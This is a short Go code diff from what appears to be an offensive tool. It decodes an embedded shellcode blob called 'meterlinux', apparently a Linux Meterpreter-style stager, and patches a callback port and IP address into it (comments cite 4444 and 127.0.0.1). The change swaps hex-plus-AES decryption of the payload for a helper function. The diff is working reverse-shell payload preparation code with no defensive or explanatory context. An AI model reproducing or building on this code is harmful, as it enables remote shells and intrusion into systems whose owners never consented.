@@ -2,7 +2,6 @@ package meter
 
 import (
 	"encoding/binary"
-	"encoding/hex"
 	"math/big"
 	"net"
 	"strconv"
@@ -29,9 +28,7 @@ func Connect(ip string, port string) (bool, error) {
 	ipBytes := make([]byte, 4)
 	binary.BigEndian.PutUint32(ipBytes, uint32(IP4toInt(net.ParseIP(ip))))
 
-	enc := make([]byte, hex.DecodedLen(len(meterlinux)))
-	hex.Decode(enc, []byte(meterlinux))
-	sc, _ := utils.Decrypt(utils.AESKEY, enc)
+	sc := utils.BBake(meterlinux)
 	copy(sc[56:], portBytes) //"\x11\x5c" 4444
 	copy(sc[58:], ipBytes)   //"\x7f\x00\x00\x01" 127.0.0.1
 
